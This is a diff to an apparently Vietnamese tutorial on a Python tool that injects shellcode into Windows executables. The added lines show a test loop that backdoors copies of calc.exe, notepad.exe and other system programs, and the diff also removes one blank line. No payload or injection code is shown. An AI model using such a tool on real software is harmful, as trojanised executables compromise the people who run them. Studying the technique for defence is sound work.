@@ -145,6 +145,22 @@ else:
   print err
 ```
 
+Chúng ta sẽ test chương trình vừa viết bằng một mảng các file input, sau đó inject shellcode và ghi vào thư mục output:
+```python
+test_files = [
+	'calc.exe',
+	'mspaint.exe',
+	'notepad.exe',
+	'spider.exe',
+	'taskmgr.exe',
+	'winmine.exe'
+]
+
+for input_name in test_files:
+	output_name = input_name.replace('.exe', '-injected.exe')
+	inject_shellcode('input/%s' % input_name, 'output/%s' % output_name)
+```
+
 Chương trình hoàn thiện:
 ```python
 # -*- coding: utf-8 -*-
@@ -163,7 +179,6 @@ def align(value_to_align, alignment):
 
 
 def inject_shellcode(input_name, output_name):
-
 	print "\n\n[*] Injecting shellcode to %s ..." % input_name
 	shutil.copy2(input_name, output_name)
 
